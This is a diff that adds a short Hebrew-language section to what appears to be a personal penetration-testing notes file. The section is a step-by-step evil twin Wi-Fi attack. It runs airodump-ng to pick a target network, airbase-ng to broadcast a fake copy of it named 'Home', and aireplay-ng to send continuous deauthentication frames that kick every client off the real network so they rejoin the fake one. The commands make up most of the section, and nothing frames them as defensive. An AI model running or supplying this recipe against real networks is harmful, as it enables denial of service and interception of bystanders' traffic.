@@ -454,6 +454,35 @@ iptables -t nat -D PREROUTING <line number>
 
 
 
+ביצוע Evil twin
+-------------------------------------
+
+אנחנו נעלה עם wifi שמזייף את הwifi המקורי, אנחנו נציף את הרשת כדי שכולם יעופו החוצה ואז אנחנו בעצם נגרום לכולם להתחבר מחדש והם יעשו התחברות אלינו כיוון שאנו מזייפים את הwifi האמיתי
+
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig wlan0 | grep Mode
+airmon-ng check wlan0
+kill <PID>
+
+
+עעכשיו נעשה סריקה על הרשת
+airodump-ng wlan0
+
+נבחר את הbssid שאנו רוצים לזייף ונקליד את הפקודה הבאה
+airbase-ng -a 90:42:13:33:42:12 --essid "Home" -c 6  wlan0
+ועכשיו הwifi המזוייף ירוץ 
+עכשיו צריך להעיף את כולם ולגרום להם לבצע התחברות מחדש
+aireplay-ng -0 0 -a 90:42:13:33:42:12 wlan0
+
+עכשיו כולם יעופו החוזה מהwifi אליו הם היו מחוברים והתחברו אלינו
+
+
+
+
+
+
 
 
 
